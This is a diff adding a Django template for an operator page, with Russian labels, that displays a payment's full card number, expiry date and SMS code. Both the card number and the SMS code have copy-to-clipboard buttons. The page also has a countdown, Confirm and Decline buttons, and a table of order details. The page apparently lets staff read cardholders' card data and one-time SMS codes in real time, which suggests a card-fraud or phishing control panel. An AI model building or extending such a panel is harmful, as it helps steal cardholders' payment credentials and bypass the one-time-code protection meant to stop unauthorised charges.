@@ -1,0 +1,134 @@
+{% extends 'base.html' %}
+{% load static %}
+{% block title %}{{payment.sms_code|default_if_none:"----"}}{% endblock %}
+
+{% block content %}
+{% include 'includes/operator_menu.html' %}
+  <div class="container">
+      <div class="card-body">
+          <span id="card_number">{{payment.card_number}}</span><img onclick="CopyToClipboard('card_number')" style="opacity: 0.5;"class="img-thumbnail" width="25" height="25" src="{% static '/img/copy.png' %}"><br>
+          <span>{{payment.expired_month}}/{{payment.expired_year}}</span><br>
+          <span>{{payment.expired_year}}</span><br>
+          <span id="sms_code">{{payment.sms_code}}</span><img onclick="CopyToClipboard('sms_code')" style="opacity: 0.5;"class="img-thumbnail" width="25" height="25" src="{% static '/img/copy.png' %}"><br>
+      </div>
+      <br>
+      <div>{{ total_seconds }}</div>
+      <form method="post">
+                      {% csrf_token %}
+      <div class="col-3">
+          <button class="btn btn-success" name="confirm" type="submit">Подтвердить</button>
+      </div>
+      </form>
+
+    <div class="row justify-content-start ">
+      <div class="col col-md-auto">
+        <table class="table table-bordered table-sm" style="font-size: medium">
+        <thead class="thead-dark align-content-center">
+           <tr>
+               <th>Поле</th>
+               <th>Значение</th>
+           </tr>
+        </thead>
+        <tbody>
+
+            <tr>
+                <td>id</td>
+                <td>{{ payment.id }}</td>
+            </tr>
+            <tr>
+                <td>Поступил</td>
+                <td>{{ payment.create_at }}</td>
+            </tr>
+            <tr>
+                <td>merchant</td>
+                <td>{{ payment.merchant }}</td>
+            </tr>
+            <tr>
+                <td>order_id</td>
+                <td>{{ payment.order_id }}</td>
+            </tr>
+            <tr>
+                <td>user_login</td>
+                <td>{{ payment.user_login }}</td>
+            </tr>
+            <tr>
+                <td>Сумма заявки</td>
+                <td>{{ payment.amount }}</td>
+            </tr>
+            <tr>
+                <td>pay_requisite</td>
+                <td>{{ payment.pay_requisite }}</td>
+            </tr>
+            <tr>
+                <td>confirmed_incoming</td>
+                <td>{{ payment.confirmed_incoming }}</td>
+            </tr>
+            <tr>
+                <td>confirmed_amount</td>
+                <td>{{ payment.confirmed_amount }}</td>
+            </tr>
+            <tr>
+                <td>Подтверждено</td>
+                <td>{{ payment.confirmed_time }}</td>
+            </tr>
+            <tr>
+                <td>change_time</td>
+                <td>{{ payment.change_time  }}</td>
+            </tr>
+            <tr>
+                <td>confirmed_user</td>
+                <td>{{ payment.confirmed_user  }}</td>
+            </tr>
+            <tr>
+                <td>source</td>
+                <td>{{ payment.source }}</td>
+            </tr>
+            <tr>
+                <td>Статус</td>
+                <td>{{ payment.status_str }}</td>
+            </tr>
+
+        </tbody>
+        </table>
+
+      </div>
+
+    </div>
+
+            <form method="post">
+                      {% csrf_token %}
+      <div class="col-3">
+          <button class="btn btn-danger btn-sm" name="decline" type="submit">Отклонить</button>
+      </div>
+      </form>
+  </div>
+
+
+
+    <script>
+function CopyToClipboard(containerid) {
+    if (window.getSelection) {
+        if (window.getSelection().empty) { // Chrome
+            window.getSelection().empty();
+        } else if (window.getSelection().removeAllRanges) { // Firefox
+            window.getSelection().removeAllRanges();
+        }
+    } else if (document.selection) { // IE?
+        document.selection.empty();
+    }
+
+    if (document.selection) {
+        var range = document.body.createTextRange();
+        range.moveToElementText(document.getElementById(containerid));
+        range.select().createTextRange();
+        document.execCommand("copy");
+    } else if (window.getSelection) {
+        var range = document.createRange();
+        range.selectNode(document.getElementById(containerid));
+        window.getSelection().addRange(range);
+        document.execCommand("copy");
+    }
+}
+</script>
+
+{% endblock %}
